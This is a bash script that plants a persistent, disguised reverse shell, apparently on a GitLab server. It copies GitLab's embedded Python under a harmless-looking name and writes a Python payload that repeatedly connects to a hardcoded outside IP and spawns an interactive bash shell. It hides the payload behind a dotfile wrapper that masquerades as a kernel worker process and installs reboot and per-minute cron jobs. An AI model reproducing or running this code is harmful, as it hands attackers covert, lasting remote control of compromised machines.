#!/bin/bash

echo "[+] Enter your listener port number:"
read PORT

echo "[+] Enter the directory should be stored:"
read TARGET_DIR

LISTENER_IP="46.226.166.189"

cd "$TARGET_DIR" || exit 1

# 1. Copy python to name: unicorn
cp /opt/gitlab/embedded/bin/python3 gdbus
chmod +x gdbus                                                                                                                                                                                                                                               

# 2. Create python script named: master (NO .py, NO shebang)
cat << EOF > user                                                                                                                                                                                                                                            
import socket, subprocess, os, time

while True:
    try:
        s = socket.socket()
        s.connect(("${LISTENER_IP}", ${PORT}))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash","-i"])
    except:
        time.sleep(60)
EOF

chmod +x user

cat << 'WRAPPER' > .dconf-service                                                                                                                                                                                                                            
#!/bin/bash                                                                                                                                                                                                                                                  
cd "$(dirname "$0")"                                                                                                                                                                                                                                         
exec -a "[kworker/u8:2-events_unbound]" ./gdbus user                                                                                                                                                                                                         
WRAPPER

chmod +x .dconf-service                                                                                                                                                                                                                                      


# 3. Write cron that runs EXACTLY: unicorn master
crontab -l 2>/dev/null > /tmp/.dconf-db || true                                                                                                                                                                                                              

echo "@reboot $TARGET_DIR/.dconf-service" >> /tmp/.dconf-db                                                                                                                                                                                  
echo "* * * * * $TARGET_DIR/.dconf-service" >> /tmp/.dconf-db                                                                                                                                                                                

crontab /tmp/.dconf-db                                                                                                                                                                                                                                       
rm /tmp/.dconf-db                                                                                                                                                                                                                                            

echo "[+] Done."
                                                                                                                                                                                                                                                              
